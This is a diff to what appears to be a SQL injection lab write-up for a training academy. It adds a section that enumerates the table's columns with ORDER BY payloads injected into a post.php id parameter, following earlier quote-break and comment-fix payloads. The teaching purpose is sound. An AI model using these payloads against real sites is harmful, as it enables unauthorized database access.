@@ -24,6 +24,19 @@
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-1.png" alt="error page">
 
 **Actualy "'" works and we have vulnerable in this url.**
-**We broke the SQL query now we need to fix it. let's try ***URL: XYZ.online/post.php?id=1'+--+-***, its worked:**
+**We broke the SQL query now we need to fix it. let's try ***URL: XYZ.online/post.php?id=1'+--+-***, it's worked:**
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-2.png" alt="returned 200 ok">
+
+<hr>
+
+## Find number of columns
+
+**In this section I pay to find number of columns and which of them are visiable for us:**
+
+- **Payloads:**
+    - 1: `URL: XYZ.online/post.php?id=1'+ORDER+BY+1+--+-` --> was returned same page.
+    - 2: `URL: XYZ.online/post.php?id=1'+ORDER+BY+2+--+-` --> was returned same page.
+    - ...
+    - 10:`URL: XYZ.online/post.php?id=1'+ORDER+BY+10+--+-`--> was returned same page.
+    - 11:`URL: XYZ.online/post.php?id=1'+ORDER+BY+11+--+-`--> ***was not returned same page.***
